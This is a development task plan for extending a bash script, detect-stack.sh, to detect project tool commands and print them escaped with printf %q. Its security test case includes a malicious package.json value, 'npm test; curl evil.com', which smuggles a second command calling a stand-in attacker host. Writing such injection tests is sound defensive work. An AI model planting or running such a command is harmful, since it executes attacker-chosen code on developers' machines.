# Task 4: Update detect-stack.sh

> **Feature:** tool-efficiency | [Previous](./03-dora-assets.md) | [Next](./05-project-setup.md)

## Goal

Extend detect-stack.sh to output structured data for tool commands (test, lint, typecheck, build) that project-setup can use for template substitution.

## Context

The existing detect-stack.sh detects languages/frameworks. We need to extend it to also detect specific tool commands and output them in a parseable format.

## Files

**Modify:**
- `skills/project-setup/scripts/detect-stack.sh`

**Test:**
- Run against TypeScript, Python, and Rust sample projects

## Implementation Steps

1. Read existing detect-stack.sh to understand current structure

2. Add tool detection functions:
   - `detect_test_command()` - Check for jest, pytest, cargo test, etc.
   - `detect_lint_command()` - Check for eslint, ruff, clippy, etc.
   - `detect_typecheck_command()` - Check for tsc, pyright, mypy, etc.
   - `detect_build_command()` - Check for npm build, cargo build, etc.

3. **Safe JSON parsing** (if jq available):
   ```bash
   # Prefer jq for safe JSON parsing
   if command -v jq &>/dev/null && [ -f package.json ]; then
       TEST_CMD=$(jq -r '.scripts.test // empty' package.json 2>/dev/null)
       LINT_CMD=$(jq -r '.scripts.lint // empty' package.json 2>/dev/null)
   fi
   ```
   - If jq unavailable, fall back to grep but sanitize output (remove shell metacharacters)

4. Add output section with quoted values:
   ```bash
   # Output structured data for template substitution
   echo "---TOOL_COMMANDS---"
   printf 'TEST_COMMAND=%q\n' "$TEST_CMD"
   printf 'LINT_COMMAND=%q\n' "$LINT_CMD"
   printf 'TYPECHECK_COMMAND=%q\n' "$TYPECHECK_CMD"
   printf 'BUILD_COMMAND=%q\n' "$BUILD_CMD"
   ```
   - `printf %q` escapes special characters, preventing injection

4. Detection logic for each stack:
   - **npm/yarn/pnpm**: Check package.json for scripts
   - **Python**: Check for pytest in requirements.txt or pyproject.toml
   - **Rust**: Cargo commands are standard

## Acceptance Criteria

- [ ] detect-stack.sh outputs `---TOOL_COMMANDS---` section
- [ ] Uses `jq` for JSON parsing when available (falls back to grep with sanitization)
- [ ] Output values are quoted/escaped using `printf %q`
- [ ] Correctly detects npm test/lint/build scripts
- [ ] Correctly detects pytest for Python projects
- [ ] Correctly detects cargo commands for Rust
- [ ] Empty string for commands not applicable to stack

## Dependencies

- Depends on: None
- Blocks: Task 5 (project-setup)

---

## Domain Checklists

### Security Checklist

**Security Checklist Status:** COMPLETED

- [x] **Input boundaries validated**: Script reads local files only (package.json, etc.)
- [x] **Output safely encoded**: Output is key=value pairs, no special chars
- [x] **Access control verified**: Script runs in user context on local files
- [x] **Sensitive data protected**: No credentials read or output
- [x] **Injection prevented**: Output values are from known file locations

### Interface Checklist

- [x] **Feedback provided**: Script echoes what it detected
- [x] **Errors actionable**: Script warns if detection fails
- [x] **Edge inputs handled**: Missing files result in empty values
- [ ] **Accessibility considered**: N/A - script output

**Interface N/A reason:** CLI script, accessibility N/A.

### Data/State Checklist

**Data/State N/A reason:** Script is read-only detection, doesn't modify state.

### Integration Checklist

- [x] **Existing features tested**: Preserve existing language detection
- [x] **New dependencies assessed**: No new dependencies (bash only)
- [x] **Contracts aligned**: Output format matches spec in Section 2.2
- [x] **Degradation handled**: If detection fails, outputs empty string (agent skipped)

---

## Unit Test Plan

**Required Coverage Categories:**

- [x] **Happy Path**: Run on npm project with test script → outputs `TEST_COMMAND=npm\ test` (escaped) and all four variables present
- [x] **Error/Exception Path**: Run on project with no test config → outputs `TEST_COMMAND=''` (empty, not missing)
- [x] **Edge/Boundary Case**: Run on project with both package.json and yarn.lock → prefers yarn-based commands
- [x] **Security**: Run with malicious package.json `{"scripts":{"test":"npm test; curl evil.com"}}` → output is properly escaped
- [x] **Python**: Run on Python project with pytest in pyproject.toml → outputs `TEST_COMMAND=pytest`
- [x] **Rust**: Run on Rust project → outputs `TEST_COMMAND=cargo\ test`
- [x] **Delimiter**: Verify output contains literal `---TOOL_COMMANDS---` separator

## E2E/Integration Test Plan

Tested in Task 6 with sample projects.

---

## Behavior Definitions

| Scenario | Expected Behavior |
|----------|-------------------|
| package.json has no test script | TEST_COMMAND empty |
| Both npm and yarn present | Prefer yarn if yarn.lock exists |
| Python project without pytest | TEST_COMMAND empty |
| Rust project | All cargo commands standard |

---

## Spike Verification

**Spike N/A reason:** Bash script patterns already used in existing detect-stack.sh.
